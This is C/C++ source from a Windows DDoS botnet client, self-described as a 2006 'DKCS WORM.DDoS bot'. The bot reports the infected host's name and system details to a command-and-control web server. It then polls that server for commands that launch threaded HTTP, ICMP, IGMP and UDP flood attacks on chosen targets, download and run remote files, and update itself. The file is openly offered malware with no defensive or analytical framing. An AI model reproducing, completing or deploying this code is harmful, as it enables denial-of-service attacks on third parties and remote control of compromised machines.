//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
unsigned long GetRandIP(void){
	char rand_ip[16];
	int a, b, c, d;
	a = rand()%254;
    b = rand()%254;
	c = rand()%254;
	d = rand()%254;
	sprintf (rand_ip, "%d.%d.%d.%d", a, b, c, d);
return inet_addr(rand_ip);
}
//-----------------------------------------------------------------
char * RandomID(char *strbuf){
	
	int		n;
	int		nl;
	char	nick[12];

	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	nl = (rand()%2)+4;
	for(n=0; n<nl; n++){
		nick[n] = (rand()%26)+97;
	}
	nick[n+1] = '\0';
	strncpy(strbuf, nick, 12);
return strbuf;
}
//-----------------------------------------------------------------
BOOL FileExist(char *fname){
	return ::GetFileAttributes(fname) != DWORD(-1);
}
//-----------------------------------------------------------------
#include "ddos.h"
#include "icmp.h"
#include "igmp.h"
#include "udp.h"
#include "download.h"
#include "update.h"
#include "sys_info.h"
//-----------------------------------------------------------------
#define MY_MACRO_LEN_BUF		1024
//-----------------------------------------------------------------
DWORD WINAPI GetCommand(LPVOID){

	int			i;
	int			ddosT;
	int			icmpT;
	int			igmpT;
	int			udpT;
	char		buf[MY_MACRO_LEN_BUF];
	char		*arg[32];
	char		*temp;
	char		*CompID;
	char		*Param;
	char		name[128];
	char		tmp[16];
	BOOL		lock=FALSE;
	DWORD		Err;
	DWORD		thread;
	DWORD		FixedInfoSize = 0;
	DWORD		thID[MY_MACRO_UDP_DDOS_THREADS];	
	HANDLE		thHL[MY_MACRO_UDP_DDOS_THREADS];
	SOCKET		socket;
	PFIXED_INFO pFixedInfo;
	SYS_INFO	sex;

	if((Err = GetNetworkParams(NULL, &FixedInfoSize)) != 0){
        if(Err != ERROR_BUFFER_OVERFLOW){
            return 0;
        }
    }
    if((pFixedInfo = (PFIXED_INFO) GlobalAlloc(GPTR, FixedInfoSize)) == NULL){
        return 0;
    }
	GetNetworkParams(pFixedInfo, &FixedInfoSize);
	CompID = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFFFF);
	Param = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFFFF);
	sex = GetSysInfo();
	strcat(CompID, MY_MACRO_WEB_CONFIG);
	strcat(CompID, "?nick=");
	wsprintf(name, "SpL_%s_[%s]", pFixedInfo->HostName, RandomID(tmp));
	strcat(CompID, name);
	strcat(CompID, "&info=");
	strcat(CompID, sex.buff);
	for(i=0; i < (int)strlen(CompID); i++){
		if(CompID[i] == ' '){
			CompID[i] = '_';
		}
	}
	strcat(Param, "GET ");
	strcat(Param, CompID);
	strcat(Param, " HTTP/1.0\r\nHost: ");
	strcat(Param, MY_MACRO_WEB_SERV);
	strcat(Param, "\r\n\r\n");
	while(1){
		socket = Connect(MY_MACRO_WEB_SERV, MY_MACRO_WEB_SERV_PORT);
		if(socket == -1){
			return 0;
		}
		send(socket, Param, (int)strlen(Param), 0);
		while(i = recv(socket, buf, MY_MACRO_LEN_BUF,0)){
			buf[i] = '\0';
			if(i == SOCKET_ERROR){
				return -1;
			}
		}
		for(i = 0; buf[i] != 0; ++i){
			if((buf[i] == '\r')&&(buf[i+1] == '\n')&&(buf[i+2] == '\r')&&(buf[i+3] == '\n')){
				temp = (char*)&buf[i]+4;
				break;
			}
		}
		arg[0] = strtok(temp, " ");
		for (i = 1; i < 32; i++){
			arg[i] = strtok(NULL, " ");
		}
		if(lstrcmp(arg[0], "!ddos") == 0){
			// !ddos get rambler.ru 80 / & 0
			// !ddos get dkcs.void.ru 80 /index.php name1=test1&name2=test2 1 login pass
			// !ddos post sss 80 /index.php name=111&email=222&message=333 0
			DDOS_INFO	ddos;
			ddos.type = arg[1];
			ddos.host = arg[2];
			ddos.port = atoi(arg[3]);
			ddos.action = arg[4];
			ddos.param = arg[5];
			if(atoi(arg[6])){
				ddos.auth.auth = true;
				char	str[128];
				char	rez[128];
				wsprintf(str, "%s:%s", arg[7], arg[8]);
				Base64Encode(str, rez, (int)strlen(str));
				ddos.auth.base64 = rez;
			}
			if(lock){
				for(ddosT = 0; ddosT < MY_MACRO_HTTP_DDOS_THREADS; ddosT++){
					TerminateThread(thHL[ddosT], NULL);
				}
			}
			for(ddosT = 0; ddosT < MY_MACRO_HTTP_DDOS_THREADS; ddosT++){
				thHL[ddosT] = CreateThread(NULL, 0, &StartDDoS, (void *)&ddos, 0, &thID[ddosT]);
			}
		}
		if(lstrcmp(arg[0], "!icmp") == 0){
			ICMP_INFO	icmp;
			icmp.host = arg[1];
			icmp.packet_size = atoi(arg[2]);

			if(lock){
				for(icmpT = 0; icmpT < MY_MACRO_ICMP_DDOS_THREADS; icmpT++){
					TerminateThread(thHL[icmpT], NULL);
				}
			}
			for(icmpT = 0; icmpT < MY_MACRO_ICMP_DDOS_THREADS; icmpT++){
				thHL[icmpT] = CreateThread(NULL, 0, &StartICMP, (void *)&icmp, 0, &thID[icmpT]);
			}
		}
		if(lstrcmp(arg[0], "!igmp") == 0){
			IGMP_INFO	igmp;
			igmp.host = arg[1];
			if(lock){
				for(igmpT = 0; igmpT < MY_MACRO_IGMP_DDOS_THREADS; igmpT++){
					TerminateThread(thHL[igmpT], NULL);
				}
			}
			for(igmpT = 0; igmpT < MY_MACRO_IGMP_DDOS_THREADS; igmpT++){
				thHL[igmpT] = CreateThread(NULL, 0, &StartIGMP, (void *)&igmp, 0, &thID[igmpT]);
			}
		}
		if(lstrcmp(arg[0], "!udp") == 0){
			UDP_INFO	udp;
			udp.host = arg[1];
			if(lock){
				for(udpT = 0; udpT < MY_MACRO_UDP_DDOS_THREADS; udpT++){
					TerminateThread(thHL[udpT], NULL);
				}
			}
			for(udpT = 0; udpT < MY_MACRO_UDP_DDOS_THREADS; udpT++){
				thHL[udpT] = CreateThread(NULL, 0, &StartUDP, (void *)&udp, 0, &thID[udpT]);
			}
		}
		if(lstrcmp(arg[0], "!download") == 0){
			DOWNLOAD_INFO DWinfo;
			DWinfo.from = arg[1];
			DWinfo.to = arg[2];
			DWinfo.exec = atoi(arg[3]);
			DWinfo.del = atoi(arg[4]);
			CreateThread(NULL, 0, &DownloadFile, (void *)&DWinfo, 0, &thread);
		}
		if(lstrcmp(arg[0], "!sool") == 0){
			UPDATE_INFO UPDinfo;
			UPDinfo.from = arg[1];
			CreateThread(NULL, 0, &Update, (void *)&UPDinfo, 0, &thread);
		}
	lock=TRUE;
	Sleep(MY_MACRO_WEB_CONF_REFRESH*1000);
	}
return 0;
}
//-----------------------------------------------------------------